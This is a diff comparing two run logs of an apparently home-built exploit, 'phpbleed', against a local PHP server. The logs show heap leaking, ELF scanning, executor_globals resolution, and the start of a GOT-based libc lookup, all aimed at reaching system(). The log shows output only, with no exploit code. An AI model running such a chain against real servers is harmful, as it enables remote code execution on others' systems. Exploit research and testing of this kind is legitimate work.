@@ -3,19 +3,54 @@
   phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
   Target: http://127.0.0.1:8089/index.php
 ============================================================
-17:51:17Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:19:16Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
 
 [Phase R-1] Heap leak
-17:51:17Z [R-1] heap_ref = 0xe908b80571a0 (reqs=1)
-  heap_ref = 0xe908b80571a0
+18:19:16Z [R-1] heap_ref = 0xed3f88a581a0 (reqs=1)
+  heap_ref = 0xed3f88a581a0
 
-[Phase R-2] Finding libphp.so
-  ELF @ 0xe908b9000000 phnum=9 (18 reqs)
-  Fine-grained scan near 0xe908b9000000
-18:02:02Z [R-2] elf candidates: [('0xe908b9000000', 9)] (reqs=577)
+[Phase R-2] Finding libphp.so (64KB-grid cascade)
+  ELF @ 0xed3f887f0000 phnum=7 (34 reqs)
+  ELF @ 0xed3f887b0000 phnum=7 (38 reqs)
+  ELF @ 0xed3f88750000 phnum=10 (44 reqs)
+  GOT-route: external ptr 0xed3f8b98ba08 from 0xed3f887f0000
+  ELF @ 0xed3f8aaa0000 phnum=7 (372 reqs)
+  GOT-route: external ptr 0xed3f8b9c3530 from 0xed3f887b0000
+  ELF @ 0xed3f8aa20000 phnum=9 (389 reqs)
+  ELF @ 0xed3f88c90000 phnum=9 (442 reqs)
+  ELF @ 0xed3f88cc0000 phnum=9 (445 reqs)
+  ELF @ 0xed3f88cf0000 phnum=9 (448 reqs)
+  ELF @ 0xed3f88d20000 phnum=10 (451 reqs)
+  ELF @ 0xed3f88d50000 phnum=9 (454 reqs)
+  GOT-route: external ptr 0xed3f8b98ba08 from 0xed3f887f0000
+  ELF @ 0xed3f8a9f0000 phnum=9 (462 reqs)
+  GOT-route: external ptr 0xed3f8b9c3530 from 0xed3f887b0000
+  ELF @ 0xed3f8a9a0000 phnum=9 (472 reqs)
+  GOT-route: external ptr 0xed3f8aa963f4 from 0xed3f8aaa0000
+  ELF @ 0xed3f8a850000 phnum=9 (510 reqs)
+  GOT-route: external ptr 0xed3f8a9e0878 from 0xed3f8aa20000
+  ELF @ 0xed3f8a230000 phnum=9 (613 reqs)
+  GOT-route: external ptr 0xed3f8c063880 from 0xed3f88d20000
+  ELF @ 0xed3f8bfc0000 phnum=13 (639 reqs)
+18:19:37Z [R-2] elf candidates: [('0xed3f887f0000', 7), ('0xed3f887b0000', 7), ('0xed3f88750000', 10), ('0xed3f8aaa0000', 7), ('0xed3f8aa20000', 9), ('0xed3f88c90000', 9), ('0xed3f88cc0000', 9), ('0xed3f88cf0000', 9), ('0xed3f88d20000', 10), ('0xed3f88d50000', 9), ('0xed3f8a9f0000', 9), ('0xed3f8a9a0000', 9), ('0xed3f8a850000', 9), ('0xed3f8a230000', 9), ('0xed3f8bfc0000', 13)] (reqs=642)
 
 [Phase R-3] Resolving symbols via .gnu_hash
-  Trying ELF @ 0xe908b9000000 (phnum=9)
-    ELF at 0xe908b9000000 no longer parseable
-18:02:03Z [R-3] FAILED (no candidate exports executor_globals)
-  No candidate exports executor_globals; not libphp
+  Trying ELF @ 0xed3f887f0000 (phnum=7)
+    symbol 'executor_globals' not found at 0xed3f887f0000
+  Trying ELF @ 0xed3f887b0000 (phnum=7)
+    symbol 'executor_globals' not found at 0xed3f887b0000
+  Trying ELF @ 0xed3f88750000 (phnum=10)
+    symbol 'executor_globals' not found at 0xed3f88750000
+  Trying ELF @ 0xed3f8aaa0000 (phnum=7)
+18:19:37Z [R-3] libphp=0xed3f8aaa0000 executor_globals=0xed3f8b9c2e40 PLTGOT=0xed3f8b99ffe8 (reqs=662)
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+
+[Phase R-4] Libc discovery via GOT dump
+    PT_DYNAMIC @ 0xed3f8b99e590
+    .dynamic via anchor -0x8 (len=75099, got=1024b)
+    Reading GOT via DT_PLTRELSZ len=64200 (0xfac8)
+    GOT read: len=64200, got 64200 bytes
+    External pointer groups: 51 total, 17 nearby
+    Trying nearby[0] = 0xed3f887fc2e0
